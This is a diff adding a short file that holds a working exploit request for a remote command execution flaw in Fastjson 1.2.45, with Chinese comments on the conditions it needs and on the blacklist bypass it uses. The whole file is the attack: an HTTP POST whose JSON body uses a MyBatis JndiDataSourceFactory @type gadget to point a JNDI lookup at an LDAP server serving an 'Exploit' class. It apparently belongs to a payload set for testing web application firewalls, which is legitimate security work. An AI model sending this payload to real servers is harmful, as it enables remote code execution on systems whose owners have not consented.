@@ -1,0 +1,16 @@
+# Fastjson_1.2.45远程命令执行漏洞
+# 前提条件：需要目标服务端存在mybatis的jar包，且版本需为3.x.x系列<3.5.0的版本。 使用黑名单绕过，org.apache.ibatis.datasource在1.2.46版本被加入了黑名单。autoTypeSupport属性为true才能使用。
+POST /?acid=80025453&bid=hd_tag_m8mv261e HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv261e
+RM-PRO-Token: cd4479086e1f31ff57b6499fc3ac4030
+RM-PRO-Time: 1742808525860
+User-Agent: curl/7.83.1
+Content-Type: application/json
+
+{
+    "b":{
+        "@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",
+        "properties":{"data_source":"ldap://localhost:1389/Exploit"}
+    }
+}
